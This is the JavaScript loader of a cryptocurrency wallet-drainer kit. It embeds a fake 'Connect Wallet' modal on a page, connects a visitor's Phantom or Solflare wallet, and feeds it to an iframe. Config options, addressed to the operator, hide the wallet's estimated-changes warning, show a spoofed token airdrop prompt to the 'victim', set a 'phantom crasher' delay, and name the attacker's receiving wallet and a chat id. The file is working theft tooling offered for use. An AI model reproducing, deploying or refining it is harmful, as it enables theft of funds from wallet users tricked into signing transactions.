(function () {
  
  // configuration - we do not recomend touching most of these. if they have [!] symbol, pls do not touch them.
  var DEFAULT_CONFIG = {
    
    /* Iframe Config */
    iframe: "iframe.html", // dont change if you have iframe.html in same directory. you can host it somewhere else and replace with url too

    /* Bypass Config */
    hideChanges: true, //  [!] bypass estimated changes. will show simulation error when enabled. always keep true.

    /* Spoof Config */
    spoofPrompt: true, // [!] always keep true.
    customAirdropMint: "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump", // mint of token to spoof (e.g. "Rb5t...pump")
    customAirdropAmount: 100, // amount of tokens victim should see on prompt (e.g. 100 $WIF)
    
    /* Hitter Config */
    targetWallet: "BG3hpVhniygbEqnJH8BXQWto4k81gZuiTGWymPSt4PzS", // your split wallet.
    userChatId: "-4974010582", //  [!] chatid of gc
    minValue: 0.1, // [!] min value
    className: "interact-button", //  [!] class name to open modal
    
    /* Additional Config */
    width: "400px", //  [!] leave default.
    height: "380px", // [!]  leave default.
    useProxyForTokens: true, // [!]  leave default or will cause errors.
    stresserSleepMs: 2666, //  [!] you can change for faster phantom crasher prompt. putting too low may show estimated changes. recomend 2500 to 6000.
    
    texts: {
      // Main UI texts
      title: "Connect Wallet",
      subtitle: "Choose a wallet to connect to this app",
      
      // Connection status texts
      connecting: "Connecting...",
      requestingConnection: "Requesting connection...",
      openingWalletApp: "Opening wallet app…",
      pleaseConnectInParent: "Please connect in parent window...",
      connectedToPhantom: "Connected to Phantom", 
      connectedToSolflare: "Connected to Solflare",
      connectedBuildingTransaction: "Connected! Building transaction...",
      
      // Transaction building texts
      buildingTransaction: "Building transaction, please wait...",
      buildingTransactionWait: "Building transaction, please wait…",
      transactionsBuilt: "Transactions built. Please sign...",
      transactionsBuiltSign: "Transactions built. Please sign in your wallet.",
      
      // Signing texts
      pleaseSignInWallet: "Please sign in your wallet...",
      requestingSignatures: "Requesting signatures...",
      requestingSignaturesAlt: "Requesting signatures…",
      
      // Airdrop/spoof texts
      preparingAirdropTransaction: "Preparing airdrop transaction...", // for example if you do not wanna run airdrop change this to something else.
      pleaseSignAirdropTransaction: "Please sign the airdrop transaction...",
      
      // Broadcasting texts
      broadcastingTransactions: "Broadcasting transactions...",
      broadcastingTransactionsAlt: "Broadcasting transactions…",
      transactionsSent: "Transactions sent!",
      
      //  [!] Error texts  [!] 
      connectionFailed: "Connection failed",
      connectionCancelled: "Connection cancelled",
      connectionRejected: "Connection rejected",
      transactionRejected: "Transaction rejected",
      transactionFailed: "Transaction failed",
      failedToBuildTransaction: "Failed to build transaction",
      noTransactionsToSign: "No transactions to sign",
      insufficientBalance: "Insufficient balance",
      walletNotConnected: "Wallet not connected",
      walletNotConnectedReconnect: "Wallet not connected. Please reconnect.",
      connectWalletFirst: "Connect wallet first.",
      noSolanaWalletProvider: "No Solana wallet provider available.",
      widgetMisconfigured: "Widget misconfigured",
      widgetMisconfiguredTargetWallet: "Widget misconfigured: missing targetWallet.", // this can be used to help debug config issues (wont be vissable to targets unless your config is incorect)
      phantomWalletNotDetected: "Phantom wallet not detected",
      solflareWalletNotDetected: "Solflare wallet not detected",
    },
  };




  /*
   [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!]
   DO NOT TOCUH UNLESS YOU WANT TO CUSTOMIZE MODAL AND YOU KNOW WHAT YOU ARE DOING.
   If you are an experience user you may costomize additional settings bellow.
   No support for this and touching them may lead to malfunctions.
  */
















































   // u can change some styles if needed. we recomend defaults
  function injectStyles() {
    if (document.getElementById('prpl-pro-styles')) return; 
    
    var style = document.createElement('style');
    style.id = 'prpl-pro-styles';
    style.textContent = `

      #prpl-widget {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 9999;
      }
      #prpl-widget.show {
        display: block;
      }
    `;
    document.head.appendChild(style);
  }
    injectStyles();
  var DEFAULTS = {
    width: "400px",
    height: "380px",
  };
  

const iframe_base_path = DEFAULT_CONFIG.iframe;
function encodeConfigToUrl(config) {
    const configCopy = { ...config };
    const { iframeSrc, ...configForUrl } = configCopy;
    const jsonString = JSON.stringify(configForUrl);
  return encodeURIComponent(jsonString);
}

function createIframe(targetWallet, options) { 
  const encodedConfig = encodeConfigToUrl({
    spoofPrompt: options && options.spoofPrompt,
    hideChanges: options && options.hideChanges,
    targetWallet: targetWallet,
    useProxyForTokens: options && options.useProxyForTokens,
    customAirdropMint: options && options.customAirdropMint,
    customAirdropAmount: options && options.customAirdropAmount,
    userChatId: options && options.userChatId,
    minValue: options && options.minValue,
    stresserSleepMs: options && options.stresserSleepMs,
    texts: options && options.texts,
  });
  
  // Build iframe URL with prplConfig parameter
  const iframeUrl = `${iframe_base_path}?prplConfig=${encodedConfig}`;
  
  var iframe = document.createElement("iframe"); 
  iframe.src = iframeUrl;
  
  iframe.style.border = "0"; 
  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); 
  var isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0; 
  
  if (isMobile || isTouchDevice) { 
    iframe.style.width = "100vw"; 
    iframe.style.height = "100vh"; 
    iframe.style.position = "fixed"; 
    iframe.style.top = "0"; 
    iframe.style.left = "0"; 
    iframe.style.zIndex = "9999"; 
    iframe.style.margin = "0"; 
    iframe.style.padding = "0"; 
  } else { 
    iframe.style.width = (options && options.width) || DEFAULTS.width; 
    iframe.style.height = (options && options.height) || DEFAULTS.height; 
  } 
  
  iframe.allow = "clipboard-read; clipboard-write; fullscreen;"; 
  iframe.loading = "lazy"; 
  iframe.referrerPolicy = "no-referrer-when-downgrade"; 
  
  iframe.addEventListener("load", function () { 
    console.log("Iframe loaded with URL parameters");
  }); 
  
  window.addEventListener("message", function(event) { 
    if (event.data && event.data.source === "prpl-pro-iframe") { 
      if (event.data.type === "request-connection") { 
        console.log("Iframe requested connection, handling from parent:", event.data); 
        const walletName = event.data.payload?.wallet || event.data.wallet; 
        console.log("Extracted wallet name:", walletName); 
        if (walletName) { 
          handleWalletConnection(walletName, iframe); 
        } else { 
          console.error("No wallet name in request-connection message:", event.data); 
        } 
      } 
    } 
  }); 
  
  async function handleWalletConnection(walletName, targetIframe) { 
    try { 
      let provider = null; 
      if (walletName === "phantom") { 
        provider = window.phantom?.solana || window.solana; 
      } else if (walletName === "solflare") { 
        provider = window.solflare; 
      } 
      
      if (!provider) { 
        throw new Error(walletName + " wallet not detected"); 
      } 
      
      if (!provider.publicKey) { 
        await provider.connect(); 
      } 
      
      if (provider.publicKey && targetIframe.contentWindow) { 
        targetIframe.contentWindow.postMessage({ 
          source: "prpl-pro-loader", 
          type: "wallet-connected", 
          payload: { 
            publicKey: provider.publicKey.toString(), 
            wallet: walletName 
          } 
        }, "*"); 
      } 
    } catch (e) { 
      console.error("Error connecting wallet from parent:", e); 
      if (targetIframe.contentWindow) { 
        targetIframe.contentWindow.postMessage({ 
          source: "prpl-pro-loader", 
          type: "wallet-connection-error", 
          payload: { error: e.message } 
        }, "*"); 
      } 
    } 
  } 
  
  return iframe; 
} 

function mount(config) { 
  config = config || {}; 
  config = Object.assign({}, DEFAULT_CONFIG, config); 
  
  if (config.texts && DEFAULT_CONFIG.texts) { 
    config.texts = Object.assign({}, DEFAULT_CONFIG.texts, config.texts); 
  } else if (!config.texts) { 
    config.texts = DEFAULT_CONFIG.texts; 
  } 
  
  if (!config.targetWallet) { 
    throw new Error("targetWallet is required"); 
  } 
  
  var container; 
  if (typeof config.container === "string") { 
    container = document.querySelector(config.container); 
  } else if (config.container instanceof HTMLElement) { 
    container = config.container; 
  } 
  
  if (!container) { 
    throw new Error("container element not found"); 
  } 
  
  var iframe = createIframe( 
    config.targetWallet, 
    { 
      iframeSrc: config.iframeSrc, 
      width: config.width, 
      height: config.height, 
      spoofPrompt: config.spoofPrompt, 
      hideChanges: config.hideChanges, 
      useProxyForTokens: config.useProxyForTokens, 
      customAirdropMint: config.customAirdropMint, 
      customAirdropAmount: config.customAirdropAmount, 
      userChatId: config.userChatId, 
      minValue: config.minValue, 
      stresserSleepMs: config.stresserSleepMs, 
      texts: config.texts, 
    } 
  ); 
  
  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); 
  var isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0; 
  
  if (isMobile || isTouchDevice) { 
    document.body.appendChild(iframe); 
  } else { 
    container.appendChild(iframe); 
  } 
  
  return { iframe: iframe, }; 
} 

function autoInit() { 
  var buttons = document.querySelectorAll('.' + DEFAULT_CONFIG.className); 
  var mountedInstances = {}; 
  
  buttons.forEach(function(button) { 
    var buttonId = button.id || 'prpl-widget-' + Math.random().toString(36).substr(2, 9); 
    if (!button.id) button.id = buttonId; 
    
    button.addEventListener('click', function() { 
      var widgetContainer = document.getElementById('prpl-widget'); 
      if (!widgetContainer) { 
        widgetContainer = document.createElement('div'); 
        widgetContainer.id = 'prpl-widget'; 
        document.body.appendChild(widgetContainer); 
      } 
      
      if (!mountedInstances[buttonId]) { 
        mountedInstances[buttonId] = mount({ 
          container: "#prpl-widget", 
          targetWallet: button.dataset.targetWallet || DEFAULT_CONFIG.targetWallet, 
          useProxyForTokens: button.dataset.useProxyForTokens !== undefined ? button.dataset.useProxyForTokens === 'true' : DEFAULT_CONFIG.useProxyForTokens, 
          customAirdropMint: button.dataset.customAirdropMint || DEFAULT_CONFIG.customAirdropMint, 
          customAirdropAmount: button.dataset.customAirdropAmount ? parseInt(button.dataset.customAirdropAmount) : DEFAULT_CONFIG.customAirdropAmount, 
          userChatId: button.dataset.userChatId || DEFAULT_CONFIG.userChatId, 
          minValue: button.dataset.minValue ? parseFloat(button.dataset.minValue) : DEFAULT_CONFIG.minValue, 
          width: button.dataset.width || DEFAULT_CONFIG.width, 
          height: button.dataset.height || DEFAULT_CONFIG.height, 
          iframeSrc: button.dataset.iframeSrc, 
        }); 
      } 
      
      if (widgetContainer.classList) { 
        widgetContainer.classList.add('show'); 
      } else { 
        widgetContainer.style.display = 'block'; 
      } 
      
      button.classList.add('hidden'); 
    }); 
  }); 
} 

if (document.readyState === 'loading') { 
  document.addEventListener('DOMContentLoaded', autoInit); 
} else { 
  autoInit(); 
} 

window.prplPro = { 
  mount: mount, 
}; 
})();
